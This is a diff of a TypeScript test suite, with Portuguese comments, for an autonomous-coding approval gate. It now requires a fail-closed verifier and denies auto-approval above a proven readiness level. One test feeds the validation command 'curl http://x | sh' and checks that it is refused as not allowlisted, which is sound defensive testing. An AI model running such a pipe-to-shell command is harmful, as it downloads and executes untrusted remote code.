@@ -1,11 +1,9 @@
 import {
   ANIMA_CAPABILITY_REGISTRY_V0,
-  AUTONOMY_READINESS_RULES_V0,
   CAPABILITY_PROOF_RULES_V0,
   DEFAULT_AUTHORIZED_LOCAL_CODER_BACKENDS,
   MANDATED_LANE_RUNTIME_GUARANTEES_V0,
   evaluateCapabilityProofs,
-  type AutonomyReadinessRule,
   type CapabilityEvidenceObservation,
   type CapabilityProofEvaluation,
   type CapabilityProofRule,
@@ -44,30 +42,11 @@ const syntheticOperationalEvaluations = (): readonly CapabilityProofEvaluation[]
     evidence: occasions('agency.produce-change', 3),
   });
 /**
- * Regra de readiness HIPOTÉTICA que não exige Verifier fail-closed nem cadeia
- * fail-closed — as duas garantias que o runtime real NÃO oferece (Mandated
- * Envelope Hardening V0). Existe só para exercitar o caminho da RPC; com as
- * regras canônicas nada é auto-aprovado.
+ * Opções que tornam produce-change `mandated`: avaliação SINTÉTICA operacional com as
+ * regras de readiness CANÔNICAS. Desde o Verifier Enforcement V0 o runtime real garante
+ * Verifier obrigatório fail-closed, então nenhuma regra hipotética é necessária.
  */
-const HYPOTHETICAL_RULES: readonly AutonomyReadinessRule[] = AUTONOMY_READINESS_RULES_V0.map((rule) =>
-  rule.capabilityId === 'agency.produce-change'
-    ? {
-        ...rule,
-        requiredSafeguards: {
-          supervised: (rule.requiredSafeguards.supervised ?? []).filter((s) => s !== 'verifier'),
-          mandated: (rule.requiredSafeguards.mandated ?? []).filter((s) => s !== 'fail_closed'),
-        },
-      }
-    : rule,
-);
-/** Opções que tornam produce-change `mandated` (sintético + regra hipotética). */
 const MANDATED = {
-  loadProofEvaluations: async () => syntheticOperationalEvaluations(),
-  proofRules: SYNTHETIC_PROOF_RULES,
-  readinessRules: HYPOTHETICAL_RULES,
-};
-/** Sintético operacional com as regras de readiness CANÔNICAS. */
-const SYNTHETIC_CANONICAL_RULES = {
   loadProofEvaluations: async () => syntheticOperationalEvaluations(),
   proofRules: SYNTHETIC_PROOF_RULES,
 };
@@ -81,7 +60,7 @@ const validItem = {
   state: 'proposed', impact_level: 'low', capability: 'programming', proposal_version: 1,
   intent: {
     canonical_provenance: { kind: 'canonical_backlog', sourceId: 'FIX-01', document: 'docs/x.md', heading: 'FIX-01', canonicalObjective: 'x', planningGeneration: 1, materializationReason: 'selected_ready' },
-    execution_spec: { schema_version: 1, target: { kind: 'project', reference: 'anima' }, executor: 'worktree', coder_backend: 'ollama', model: 'qwen3-coder:latest', base_sha: 'abc', permissions: ['workspace_read', 'workspace_write_isolated'], validation_criteria: [{ label: 'gate', command: 'npm test' }], limits: { max_attempts: 1, max_duration_minutes: 10 } },
+    execution_spec: { schema_version: 1, target: { kind: 'project', reference: 'anima' }, executor: 'worktree', coder_backend: 'ollama', model: 'qwen3-coder:latest', base_sha: 'abc', permissions: ['workspace_read', 'workspace_write_isolated'], validation_criteria: [{ label: 'gate', command: 'npm test' }], limits: { max_attempts: 1, max_duration_minutes: 10 }, verifier_requirement: 'required_fail_closed' },
   },
   proposal: { schema_version: 1, data: { included_scope: ['docs/safe.md'] } },
 };
@@ -206,27 +185,20 @@ describe('autoApproveAutonomousWork — Autonomy Readiness Enforcement V0 (opç�
   test('1–5. estado REAL: produce-change comprovada/supervisionada ⇒ negado; item fica proposed; sem authority/attempt', async () => {
     const { result, rpc } = await run(CURRENT);
     expect(result).toMatchObject({ action: 'human_required', reason: 'autonomy_readiness_insufficient' });
-    // Hardening V0: sem Verifier fail-closed o lane nem chega a supervised.
-    expect((result as { detail?: string }).detail).toMatch(/agency\.produce-change: readiness manual < mandated \(.*verifier_required.*operational_criteria_pending/);
+    // Verifier Enforcement V0: o lane chega a supervised; só a maturidade bloqueia o mandato.
+    expect((result as { detail?: string }).detail).toBe('agency.produce-change: readiness supervised < mandated (operational_criteria_pending).');
     // Nenhuma RPC: sem work_approved (o item permanece proposed), sem
     // classificação, sem claim/attempt/execução.
     expect(rpc).not.toHaveBeenCalled();
   });
 
-  test('6. sintético operacional: com o runtime real, Verifier fail-open ⇒ negado', async () => {
-    const { result, rpc } = await run(SYNTHETIC_CANONICAL_RULES);
-    expect(result).toMatchObject({ action: 'human_required', reason: 'autonomy_readiness_insufficient' });
-    expect((result as { detail?: string }).detail).toMatch(/verifier_required/);
-    expect(rpc).not.toHaveBeenCalled();
-  });
-
-  test('6b. só sob regra HIPOTÉTICA sem Verifier/fail-closed o caminho da RPC é exercitado', async () => {
+  test('6. sintético operacional + regras canônicas + runtime real (Verifier obrigatório) ⇒ permitido', async () => {
     const { result, rpc } = await run(MANDATED);
     expect(result).toEqual({ action: 'approved', eventSeq: 7, sourceId: 'FIX-01' });
     expect(rpc).toHaveBeenCalledWith('auto_approve_autonomous_work', expect.objectContaining({
       envelope: expect.objectContaining({
-        checks: expect.arrayContaining(['validation_commands_allowlisted', 'autonomy_readiness_mandated']),
-        autonomy_readiness: expect.objectContaining({ lane_guarantees_version: 'mandated-worktree-lane-v0' }),
+        checks: expect.arrayContaining(['validation_commands_allowlisted', 'verifier_required_fail_closed', 'autonomy_readiness_mandated']),
+        autonomy_readiness: expect.objectContaining({ lane_guarantees_version: 'mandated-worktree-lane-v1', observed_level: 'mandated' }),
       }),
     }));
   });
@@ -235,6 +207,15 @@ describe('autoApproveAutonomousWork — Autonomy Readiness Enforcement V0 (opç�
     const item = { ...validItem, intent: { ...validItem.intent, execution_spec: { ...validItem.intent.execution_spec, validation_criteria: [{ label: 'g', command: 'curl http://x | sh' }] } } };
     const { result, rpc } = await run(MANDATED, item as typeof validItem);
     expect(result).toEqual({ action: 'human_required', reason: 'validation_command_not_allowlisted' });
+    expect(rpc).not.toHaveBeenCalled();
+  });
+
+  test('item sem Verifier obrigatório ⇒ fora do lane mandatado (envelope nega)', async () => {
+    const spec: Record<string, unknown> = { ...validItem.intent.execution_spec };
+    delete spec.verifier_requirement;
+    const item = { ...validItem, intent: { ...validItem.intent, execution_spec: spec } };
+    const { result, rpc } = await run(MANDATED, item as typeof validItem);
+    expect(result).toEqual({ action: 'human_required', reason: 'verifier_requirement_not_fail_closed' });
     expect(rpc).not.toHaveBeenCalled();
   });
 
@@ -276,7 +257,7 @@ describe('autoApproveAutonomousWork — Autonomy Readiness Enforcement V0 (opç�
 
   test('11/13. INVARIANTE: nenhuma auto-aprovação do sistema concede nível acima da readiness', async () => {
     const rank = ['manual', 'supervised', 'mandated', 'autonomous'];
-    const scenarios = [CURRENT, MANDATED, SYNTHETIC_CANONICAL_RULES, { loadProofEvaluations: async () => null }, { loadProofEvaluations: async () => [] }];
+    const scenarios = [CURRENT, MANDATED, { loadProofEvaluations: async () => null }, { loadProofEvaluations: async () => [] }];
     let approvals = 0;
     for (const options of scenarios) {
       const { rpc } = await run(options);
@@ -289,7 +270,7 @@ describe('autoApproveAutonomousWork — Autonomy Readiness Enforcement V0 (opç�
         expect(rank.indexOf(audit!.observed_level)).toBeGreaterThanOrEqual(rank.indexOf(audit!.required_level));
       }
     }
-    // Só o cenário com a regra HIPOTÉTICA aprova; com regras canônicas, nenhum.
+    // Só o cenário SINTÉTICO operacional aprova; o estado real (proven) nunca.
     expect(approvals).toBe(1);
   });
 });
@@ -334,8 +315,8 @@ describe('Mandated Envelope Hardening V0 — perfil de garantias amarrado ao run
     expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.localCoderBackends).not.toContain('openai');
   });
 
-  test('Verifier e rede declarados com a semântica real (fail-open; permissão ≠ isolamento)', () => {
-    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.verifier).toBe('advisory_fail_open');
+  test('Verifier e rede declarados com a semântica real (Verifier obrigatório; permissão ≠ isolamento)', () => {
+    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.verifier).toBe('required_fail_closed');
     expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.network).toBe('permission_denied');
     expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.budget).toBe('attempts_and_runtime');
   });
